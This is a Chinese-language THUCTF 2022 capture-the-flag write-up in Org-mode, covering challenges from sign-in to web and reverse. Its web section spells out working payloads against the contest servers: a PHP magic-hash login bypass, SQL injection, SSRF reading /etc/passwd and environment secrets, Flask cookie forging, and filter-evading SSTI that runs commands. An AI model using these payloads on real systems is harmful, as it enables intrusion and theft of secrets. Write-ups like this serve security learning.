@@ -1,0 +1,312 @@
+#+title: THUCTF 2022 Writeup
+#+author: nft_tables
+
+#+LATEX_CLASS: ctexart
+#+LATEX_CLASS_OPTIONS: [fontset=none]
+#+LATEX_COMPILER: xelatex
+#+LATEX_HEADER: \setCJKmainfont{Noto Serif CJK SC}
+#+LATEX_HEADER: \setCJKsansfont{Noto Sans CJK SC}
+#+LATEX_HEADER: \setCJKmonofont{Sarasa Fixed Slab SC}
+#+LATEX_HEADER: \setmonofont{Iosevka Slab}[Contextuals=Alternate]
+#+LATEX_HEADER: \newfontfamily\mma{Iosevka Slab}[RawFeature=-calt;+WFLM, NFSSFamily=MMAFamily]
+
+#+LATEX: \clearpage
+
+本次比赛单人组队，作为一次“现场学习能力大赛”，通过网上到处学习，计解出题目 23 道，
+总分 7618。以下简要按题目的分类给出本人解题的思路，附录中则辑录了使用的所有脚本
+代码以及赛场上被证明是失败的一些尝试。本文的代码由 Org-mode 生成，可以在
+https://github.com/OceanS2000/THUCTF-2022-Writeup 上查看。
+
+* 签到题
+** checkin
+=78 solves, 200 pts=
+
+题目描述系比赛 Discord 群组的邀请链接，加入后可以在 announcement 频道的描述中找
+到 flag。
+
+** check your nc
+=82 solves, 200 pts=
+
+开启容器后，连接相应的端口（我偏不用 =nc= ）
+
+#+begin_example
+$ socat tcp:nc.thuctf.redbud.info:32066 readline
+# Before we start, we need to check your identity.
+Input your teamtoken:
+#+end_example
+
+按照提示输入 team token 即可获得 flag。
+
+** survey
+=26 solves, 507 pts=
+
+根据提示完成调查问卷后，即可获得一串字符，注意到结尾有两个等号，尝试 base64 解码
+后获得 flag。
+
+* King of Hill
+** 人间观察 ～ variety
+=55 solves, 201 pts=
+
+题目为一系列的博弈问题，每分钟会根据所有作答的参赛者结果结算相应的分数，最后的成
+绩则是近 100 轮的成绩之和。由于 flag 点击就送，加上本人花了大量的时间现场学习其
+它题目需要的知识，采用的是定期手动查看排行榜更新策略的摸鱼解法。
+
+最终排名如下
+#+begin_example
+ScoreBoard:
+Rank 1: XROS HEART with score - 1274
+Rank 1: onlyKewth with score - 1274
+Rank 3: NT49 with score - 1178.2142857142858
+Rank 4: team-Kay with score - 1175.3571428571436
+Rank 5: 大家靠蒙都能队 with score - 1100
+Rank 6: axp with score - 1078.214285714286
+Rank 7: Galf with score - 1000
+> Rank 7: nft_tables with score - 1000.0
+#+end_example
+
+1000 分意味着平均每轮的成绩均为 10，是一个非常中庸的方案（也带来了非常中庸的结果）。
+
+* Misc
+flagmarket level1 一题虽归类为 misc，为讨论方便计，和 level2 一起在 Crypto 部分介绍。
+
+#+INCLUDE: "Little_Klee/README.org" :minlevel 2
+
+#+INCLUDE: "Treasure_Hunter/README.org" :minlevel 2
+
+* Crypto
+
+#+INCLUDE: "Mimic_Query/README.org" :minlevel 2
+
+#+INCLUDE: "Flag_Market/README.org" :minlevel 2
+
+* Pwn
+
+#+INCLUDE: "Baby_Stack/README.org" :minlevel 2
+
+* Web
+
+** What is =$?= flag 1
+=33 solves, 203 pts=
+
+打开网页，发现 PHP 代码已经贴出，目标是使用 admin 身份登入。首先需要处理的是基于
+IP 地址的认证：
+#+begin_src php
+if ($_GET['action'] == 'login' && $_POST['cb_user'] == 'admin' && $_SERVER['REMOTE_ADDR'] != '127.0.0.1')
+    die('access denied');
+#+end_src
+但是，注意到这里判断请求采用的是 =$_GET= ，而之后的全都是
+=$_REQUEST= 或 =$_POST= 。前者来自 url query，而后者来自 POST 方法的 form data，
+从而可以绕过这个检查。而对于密码校验的部分
+#+begin_src php
+!preg_match('/a/si', $_POST['cb_pass']) && md5($_POST['cb_pass']) == md5($_POST['cb_salt'].'a')
+#+end_src
+看似需要找到一对 md5 碰撞。但是 PHP 的 ~==~ 运算符是所谓的“弱比较”，它会把 =0e=
+开头的字符串当成科学计数法看待，从而返回相等的结果。查阅
+https://github.com/spaze/hashes/blob/master/md5.md 找到一个结尾为 =a= 的字符串即
+可。
+
+#+begin_src bash
+curl 'http://nc.thuctf.redbud.info:31653/code.php?action=nocare' \
+    -v -F action=login -F cb_user=admin \
+    -F cb_pass=QLTHNDT -F cb_salt=abcLFWKfYf
+#+end_src
+
+** What is =$?= flag 2
+=18 solves, 247 pts=
+
+观察给出 flag 的一行 =die(lib\Flag::FLAG1);= ，从 =autoload= 函数判断可能存在一
+个 =/lib/flag.php= 文件保存另外的 flag。尝试访问这个地址返回 200，这印证了我们的
+猜测。
+
+注意到 =save_item= 部分只检查 =uuid= 是
+否不含空格，因此可以执行 SQL 注入，将 =filename= 域修改成我们想要的值。
+#+begin_src bash
+curl 'http://nc.thuctf.redbud.info:31653/code.php?action=nocare' \
+    -b PHPSESSID=2895f9712b16678a895c86be20c6cba7 \
+    -F action=save_item -F 'item[name]=name' \
+    -F "item[uuid]=\"1'/*1234-*/,'lib/flag.php')#11111111\""
+#+end_src
+这里的一个插曲是 MySQL 对 =--= 格式的注释处理和网上很多教学有一点区别：其要求
+=--= 和注释之间至少需要一个空格（参见
+https://dev.mysql.com/doc/refman/8.0/en/ansi-diff-comments.html ）而 =#= 开头的
+注释不需要空格。这花费了我相当的时间。
+
+总之，成功之后调用 =list_item= 即可看到 =lib/flag.php= 的内容。
+
+** PyChall flag 1
+=12 solves, 435 pts=
+
+从名字和 =Server: Werkzeug/2.2.2 Python/3.10.7= 推断，可能是一个 Flask 程序。于
+是尝试对返回的 cookie 进行解码
+#+begin_src bash
+$ flask-unsign --decode \
+   --cookie=eyJpc0FkbWluIjowLCJ1c2VybmFtZSI6IicifQ.YzVi7g.86cQ9pDVtbGkke8FpmBsQCLpIs8
+{'isAdmin': 0, 'username': "'"}
+#+end_src
+推断目标是泄漏私钥使得我们可以修改 =isAdmin= 的值。
+
+首先看到登录框会影响登录后页面，尝试 SSTI 后发现不成功。
+
+然后将目标放到请求框上来，发现其能通过 =file:= 来访问本机任意文件
+#+begin_src bash
+$ curl -b session=... \
+   'http://nc.thuctf.redbud.info:32088/download/' \
+   -F url='file:///etc/passwd'
+请求结果：
+root:x:0:0:root:/root:/bin/bash
+# ...
+#+end_src
+
+于是尝试访问 =/proc/self/cmdline= 确定文件名是 =app.py= ，但是在尝试读取时发现
+#+begin_src bash
+$ curl -b session=... \
+   'http://nc.thuctf.redbud.info:32088/download/' \
+   -F url='file:///proc/self/cwd/app.py'
+页面内容含有非法字符！%
+#+end_src
+看来可能有奇怪的过滤，再尝试 =/proc/self/environ=
+#+begin_src bash
+$ curl -b session=... \
+   'http://nc.thuctf.redbud.info:32088/download/' \
+   -F url='file:///proc/self/environ' | xargs -0 -n 1
+# ...
+SECRET_KEY=74a832d6-c6ef-485c-a09c-3f1c38221674
+# ...
+#+end_src
+
+于是立刻可以使用 =flask-unsign= 获得我们想要的 cookie
+#+begin_src bash
+flask-unsign --secret '74a832d6-c6ef-485c-a09c-3f1c38221674' \
+    --sign --cookie "{\"isAdmin\" : 1, \"username\" : \"'\" }"
+eyJpc0FkbWluIjoxLCJ1c2VybmFtZSI6IicifQ.YzvvTQ.yG5D3j33LD6ae3xJ0Z8G9AKFnt0
+#+end_src
+
+之后再访问 =/flag= 即可。
+#+begin_src bash
+curl -b session='eyJpc0FkbWluIjoxLCJ1c2VybmFtZSI6IicifQ.YzvvTQ.yG5D3j33LD6ae3xJ0Z8G9AKFnt0' \
+    'http://nc.thuctf.redbud.info:32088/flag'
+#+end_src
+
+#+RESULTS:
+: Here is your flag: THUCTF{Congratu1ate!Now-try-to-RCEeeee!@}
+
+** PyChall flag 2
+=9 solves, 586 pts=
+
+从之前奇怪的“非法字符”考虑，可能 =download= 的结果会吃 SSTI。于是使其请求自己的
+服务器，果然 ={{7*7}}= 可以触发。
+
+于是接下来就是和关键字过滤斗智斗勇的环节。 =class= 会被吃掉，但是 Python 一切皆
+哈希表，可以用 join 技术绕过
+#+begin_example
+{{request.__class__.mro()[-1].__subclasses__()}} ==>
+{{request[["__c","lass__"]|join].mro()[-1][["__s","ubc","lasses__"]|join]()}}
+#+end_example
+得到的东西用 =perl -MHTML::Entities -pe 'decode_entities($_);'= unescape 之后找
+到 =subprocess.Popen= ，就实现了任意命令执行。
+#+begin_example
+{{request[["__c","lass__"]|join].mro()[-1][["__s","ubc","lasses__"]|join]()[410](
+   [["/read", "flag"]|join,],stdout=-1).communicate()[0].decode()}}
+#+end_example
+
+** Baby Gitlab
+=22 solves, 224 pts=
+
+打开之后发现是一个 GitLab，并且提示指出了 CVE-2021-22205。搜索之后查得
+https://github.com/inspiringz/CVE-2021-22205 。不过其使用的 requestbin API 已经年
+久失修，手动在 requestbin.io 处生成了一个，并且修正了其爬取 requestbin 结果的正
+则表达式之后，即可直接利用其获取 flag。
+
+* Reverse
+#+INCLUDE: "Reverse/README.org" :minlevel 2
+
+#+LATEX: \clearpage
+
+* 附录
+** 失败的尝试们
+*** Easy LLVM
+大概（？）理解了这个 pass，但是为了凑够分数，似乎需要生成一个数 MB 的 =push= 函
+数调用，本地处理需要三分钟左右，感觉并不是正确解法。同时，对于 =backdoor= 的利用
+方法也不清楚。
+
+*** old days
+阅读了一些上古 =a.out(5)= ，但是在没有办法执行的情况下很难只靠代码读懂它在干什么。
+试图使用 unicorn 手动加载二进制模拟执行，因为需要 hook 所有的 =int 80= 没有能在
+比赛时间内写完。
+
+*** easy encrypt
+学习了 $e=2$ 时的 RSA （https://en.wikipedia.org/wiki/Rabin_cryptosystem ），得
+到了 =KEY=，但是剩下的部分 z3 处理不动。
+
+** 代码列表
+*** =Mimic_Query=
+:PROPERTIES:
+:ID:       94e877aa-9c12-4878-818c-795885c28fd6
+:END:
+**** =CodeGenerator.m=
+#+ATTR_LATEX: :options fontfamily=MMAFamily
+#+begin_src wolfram
+y[i_] :=
+ x[7] \[Xor] x[Mod[6 + i, 7]] \[Xor] x[Mod[i, 7]] \[Xor]
+  x[Mod[1 + i, 7]] \[Xor] x[Mod[3 + i, 7]] \[Xor]
+  ((x[Mod[i, 7]] \[Xor] x[Mod[4 + i, 7]]) &&
+   (x[Mod[1 + i, 7]] \[Xor] x[Mod[2 + i, 7]] \[Xor] x[Mod[3 + i, 7]] \[Xor]
+      x[Mod[5 + i, 7]])) \[Xor]
+  ((x[Mod[1 + i, 7]] \[Xor] x[Mod[2 + i, 7]]) &&
+   (x[Mod[3 + i, 7]] \[Xor] x[Mod[5 + i, 7]]))
+
+toStringForm[exp_] := BooleanConvert[exp, "DNF"] //. {
+    x[i_] :> List["B" <> ToString[i]],
+    Not[v_] :> {"( ", v, " == ", "0", " )"},
+    And[a_, b_] :> {"( ", a, " and ", b, " )"},
+    Or[a_, b_] :> {"( ", a, " or ", b, " )"}
+    } // StringJoin
+
+codedMsg =
+  Table[With[{msgbits = (# != 0) & /@ IntegerDigits[msg, 2, 8]},
+    Block[{x = (msgbits[[# + 1]] &)},
+     Table[x[i], {i, 0, 7}]~Join~Table[y[i], {i, 0, 6}]
+     ]]
+   , {msg, 0, 255}];
+queryMsg =
+  Table[toStringForm@x[i], {i, 0, 7}]~Join~
+   Table[toStringForm@y[i], {i, 0, 6}];
+
+"query = " <> ExportString[queryMsg, "PythonExpression"] //
+  OutputForm >> "~/Ghidra/MimicQuery/msg.py"
+"coded = " <> ExportString[codedMsg, "PythonExpression"] //
+  OutputForm >>> "~/Ghidra/MimicQuery/msg.py"
+#+end_src
+
+**** =solution.py=
+#+INCLUDE: "./Mimic_Query/solution.py" src python
+
+**** =solution_lite.py=
+#+INCLUDE: "./Mimic_Query/solution_lite.py" src python
+
+*** =Flag_Market=
+**** =flagmarket_lv1.py=
+#+INCLUDE: "Flag_Market/flagmarket_lv1.py" src python
+
+**** =flagmarket_lv2.py=
+#+INCLUDE: "Flag_Market/flagmarket_lv2.py" src python
+
+*** =Baby_Stack=
+**** =lv0.py=
+#+INCLUDE: "Baby_Stack/lv0.py" src python
+**** =lv1.py=
+#+INCLUDE: "Baby_Stack/lv1.py" src python
+**** =lv2.py=
+#+INCLUDE: "Baby_Stack/lv2.py" src python
+**** =lv3.py=
+:PROPERTIES:
+:ID:       29c6d857-5b0e-477a-a4ee-2801b52dc83a
+:END:
+#+INCLUDE: "Baby_Stack/lv3.py" src python
+
+*** Calculator
+**** =calculator.py=
+:PROPERTIES:
+:ID:       8229e639-5ca4-4a96-b0dc-59dd5cef0ba0
+:END:
+#+INCLUDE: "./Reverse/calculator.py" src python
